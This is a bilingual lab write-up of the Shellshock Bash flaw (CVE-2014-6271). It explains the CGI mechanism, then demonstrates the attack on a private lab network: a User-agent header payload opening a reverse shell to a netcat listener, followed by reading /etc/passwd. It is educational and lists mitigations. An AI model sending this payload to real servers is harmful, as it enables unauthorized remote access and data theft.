# 🎥 Shell Shock Vulnerability CVE-2014-6271

## 🔎 What is CVE ?
💬
![image](https://user-images.githubusercontent.com/118449010/206201960-90658f31-3830-43e9-9488-7a41e0aaaba8.png)
> CVE is short for `Common Vulnerabilities and Exposures.` It means publicly known information-security vulnerabilities in publicly released software packages. The informaion is then assigend a CVE ID by a CVE Numbering Authority, CNA. CVEs help IT organizations to more systematically identify security flaws and compensate for vulnerabilities. And it consists of a structure in the order of prefix, year, and numbering.
> #### <div align=center> CVE(Prefix) - 1996(Year) - 0224(Numbering) </div>
> 



## 🔎 What is Shell Shock & Bash ?
💬
> **The Shellshock vulnerability affects Unix-based OS System Bash, a program that various Unix-based OS systems use to execute command lines and command scripts.** It is often installed as the system's default command-line interface. Shellshock is an arbitrary code execution(In computer security, arbitrary code execution (ACE) is an attacker's ability to run any commands or code of the attacker's choice on a target machine or in a target process.) vulnerability that offers a way for users of a system to execute commands that should be unavailable to them. Usually, Attackers steal root accounts and execute malicious code through these vulnerabilities. This happens through Bash's "function export" feature, whereby one Bash process can share command scripts with other Bash processes that it executes. This feature is implemented by encoding the scripts in a table that is shared between the processes, known as the environment variable list. Each new Bash process scans this table for encoded scripts, assembles each one into a command that defines that script in the new process, and executes that command. The new process assumes that the scripts found in the list come from another Bash process, but it cannot verify this, nor can it verify that the command that it has built is a properly formed script definition. Therefore, an attacker can execute arbitrary commands on the system or exploit other bugs that may exist in Bash's command interpreter, if the attacker has a way to manipulate the environment variable list and then cause Bash to run. 
>
> **쉘쇼크 취약점은 다양한 유닉스 기반 운영체제에서 명령줄과 명령 스크립트를 실행하는 데에 사용되는 Bash에 영향**을 줍니다. Bash는 시스템 기본 명령줄 인터페이스로서 설치됩니다. 쉘쇼크는 시스템 사용자가 사용할 수 없는 명령을 실행하는 방법을 제공하는 임의 코드 실행 취약점입니다. (임의 코드 실행은 컴퓨터 보안에서 공격자가 선택한 어떤 명령이나 코드를 타겟 시스템 또는 타겟 프로세스에서 실행할 수 있는 능력을 말합니다.) 일반적으로, 공격자들은 환경 변수를 이용합니다. 공격자들은 이러한 취약점을 이용해 루트 계정을 탈취하고 악의적인 코드를 실행합니다. 이러한 일이 발생하는 원인은 Bash의 "함수 내보내기" 기능입니다. 이는 한 프로세스가 실행하는 다른 Bash 프로세스와 명령 스크립트를 공유할 수 있게 합니다. 해당 기능은 환경 변수 목록으로 알려진 프로세스 간에 공유되는 테이블의 스크립트를 인코딩하여 구현됩니다. 각 New Bash 프로세스는 해당 테이블에서 인코딩된 스크립트를 검색하고, 새로운 프로세스에서는 각 스크립트를 정의하는 명령어로 구성하고, 해당 명령어를 실행합니다. 새 프로세스에서는 목록에서 찾은 스크립트가 다른 Bash 프로세스에서 가져온 것으로 추정하지만 실제로는 이를 입증할 수 없을 뿐만 아니라, 빌드한 명령어가 제대로 구성된 스크립트 정의인지 확인할 수도 없습니다. 그러므로, 공격자는 환경 병수 목록을 조작해서 Bash를 실행하게 된다면 공격자는 시스템에서 임의 명령(ACE)을 실행하거나 Bash의 명렁 인터프리터에 있을 수 있는 또 다른 버그를 이용할 수 있습니다.

> 


## :recycle: Shell Shock Process
![image](https://user-images.githubusercontent.com/118449010/206294250-b511a3e6-bdd9-43e9-8172-2ad249e03e0f.png)

```
Attacker sends HTTP Packets(Including malicious commands on CGI Page.
공격자는 CGI 페이지에 악의적인 명령어를 포함한 HTTP 패킷을 전송합니다.
```
```
When the CGI URI is transferred to the Apache Web Server, the Apache verifies the request.
Apache Web Server에 CGI URI가 전송됐을 때, Apache는 해당 요청을 검사합니다.
```
```
Apache Starts a new process using the fork() for CGI Requests. After that, Run the CGI Program using the exec().
Apache는 CGI 요청을 fork() 함수를 이용하여 새로운 프로세스를 시작한 다음, exec() 함수를 이용하여 CGI 프로그램을 실행합니다.
```
```
The CGI works as a **#!/bin/bash** request. That's why It use the exec() to access the Bash, and the Shell Script works.
해당 CGI는 **#!/bin/bash** 요청으로 동작하기 때문에 exec() 함수를 이용해 Bash에 접근하게 되고, 쉘 스크립트가 동작하게 됩니다.
```



## :closed_book: Attackable Versions
### CVE-2014-6271
```
bash-4.2.45-5.el7_0.2
bash-4.1.2-15.el6_5.1
bash-4.1.2-15.el6_5.1.sjis.1
bash-4.1.2-9.el6_2.1
bash-4.1.2-15.el6_4.1
bash-3.2-33.el5.1
bash-3.2-33.el5_11.1.sjis.1
bash-3.2-24.el5_6.1
bash-3.2-32.el5_9.2
bash-3.0-27.el4.2
```

## 🔎 What is CGI ?
💬
> CGI is short for Common Gateway Interface. It is an interface specification that enables web servers to execute an external program, typically to process user requests. Such programs are often written in a scripting language and are commonly referred to as CGI scripts, but they may include compiled programs.
> 
> CGI는 Common Gateway Interface의 약어입니다. CGI는 일반적으로 사용자 요청을 처리하기 위해 웹 서버가 외부 프로그램을 실행할 수 있도록 하는 인터페이스 입니다. 특정 프로그램들은 스크립트 언어로 쓰여져 있으며, 일반적으로 CGI 스크립트로 여겨지지만 컴파일된 프로그램을 포함할 수도 있습니다. 
>
> When a web server uses the Common Gateway Interface (CGI) to handle a document request, it copies certain information from the request into the environment variable list and then delegates the request to a handler program. If the handler is a Bash script, or if it executes Bash, then Bash will receive the environment variables passed by the server and will process them as described above. This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted document request.
>
> 웹 서버가 CGI를 사용하여 문서 요청을 처리할 때, 환경 변수 목록에 요청된 특정 정보를 복사 한 다음 요청을 핸들러 프로그램에 위임합니다. 핸들러가 Bash 스크립트이거나 Bash를 실행하는 경우, Bash는 서버가 전달한 환경 변수를 수신할 것이고 앞에서 설명한 대로 문서 요청을 처리할 것입니다. 이는 공격자가 특수하게 조작된 문서 요청을 통해 쉘 쇼크 취약점을 촉발시킬 수 있음을 뜻합니다.
> 

## :hammer: Tool
### Victim Information
<img src="https://img.shields.io/badge/Ubuntu-FFB71B?style=for-the-badge&logo=Ubuntu&logoColor=black"> <img src="https://img.shields.io/badge/Apache-D22128?style=for-the-badge&logo=Apache&logoColor=white"> <img src="https://img.shields.io/badge/VMware-607078?style=for-the-badge&logo=VMware&logoColor=white"> 

- **OS**: Ubuntu 14.04.1 LTS
- **IP**: 192.168.0.144
- **Bash**: 4.3.11

### Attacker Information
<img src="https://img.shields.io/badge/Kali Linux-557C94?style=for-the-badge&logo=Kali Linux&logoColor=white"> <img src="https://img.shields.io/badge/VMware-607078?style=for-the-badge&logo=VMware&logoColor=white"> 
- **OS**: Kali Linux
- **IP**: 192.168.0.138
- **Tool**: Burp-suite

# 🎥 Attack Demonstration
## 💻 Ubuntu 14.04.1
### 📄 Check for vulnerabilities
```
$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```
- **Safe** :heavy_check_mark:
```
#this,#e5e5e5 is a test
```
- **Vulnerable** :x:
```
vulnerable
this is a test
```

- 📄 make **.py** on /var/www/cgi-bin
```
sudo vim KWAKJOONHWAN_SHELLSHOCK.py
```
```python
#!/usr/bin/python3
print('Content-Type: text/plain')
print('')
print('KWAKJOONHWAN_SHELLSHOCK')
```
![a](https://user-images.githubusercontent.com/118449010/206300406-3bcc7299-76e8-4df4-ac6c-7b5ce51cec23.png)

- 📄 make **.sh** on /var/www/cgi-bin
```
sudo vim KWAKJOONHWAN_SHTEST.sh
```
```python
#!/bin/bash

echo "Content-type: text/html"
echo ""

echo '<html>'
echo '<head>'
echo '<iframe src="./KWAKJOONHWAN_SHELLSHOCK.py">'
echo '</iframe>'
echo '</head>'
echo '</html>'
```
![sh](https://user-images.githubusercontent.com/118449010/206301593-9ed0cba9-88a2-49ce-badb-299fad1a5205.png)
![3](https://user-images.githubusercontent.com/118449010/206300677-826c2434-fd7c-4307-925c-21957227c705.png)



## 💻 Kali Linux
- Reverse-Shell Connection: set listen mode, for inbound connects and set the source port 8888
```
#nc -l -p port [options] [hostname] [port]
nc -nlvp 8888
```
![2](https://user-images.githubusercontent.com/118449010/206302559-0631a90c-c46b-4ed9-9a3f-a074dea6ac3a.png)

- 📄 Insert Shell Shock Attack command into the User-agent Header.
```
User-agent: () { :;}; /bin/bash -i >& /dev/tcp/192.168.0.138/8888 0>&1
```
![1](https://user-images.githubusercontent.com/118449010/206303605-cc7002c5-b817-4a7e-a31c-a9196af913c0.png)


## :scroll: Result
- Reverse Shell connection: **`connect to [192.168.0.138] from (UNKOWN) [192.168.0.144]`**

![138to144](https://user-images.githubusercontent.com/118449010/206304362-0e979d23-ba16-4fa4-abeb-134b1a304e8d.png)

- Remote Code Execution: `cat /etc/passwd`

![catetcpasswd](https://user-images.githubusercontent.com/118449010/206303977-448da67c-a320-455c-a866-72df5d036c02.png)
```
Enter: cat /etc/passwd
Result: 
        root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        sys:x:3:3:sys:/dev:/usr/sbin/nologin
        sync:x:4:65545:sync:/bin:/bin/sync
        games:x:5:60:games:/usr/games:/usr/sbin/nologin
        man:x:6:12:man:/var:cache/man:/usr/sbin/nologin
        lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
        mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
        news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
        uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
        proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```


## 🔎 Preventive measures
- Bash Update
- Delete Unnecessary CGI Page
- Disable Unnecessary CGI Service
- BlocK with WAF, IDS, and IPS

![header](https://capsule-render.vercel.app/api?type=waving&color=auto&height=300&section=header&text=KWAK%20JOONHWAN&fontSize=90)
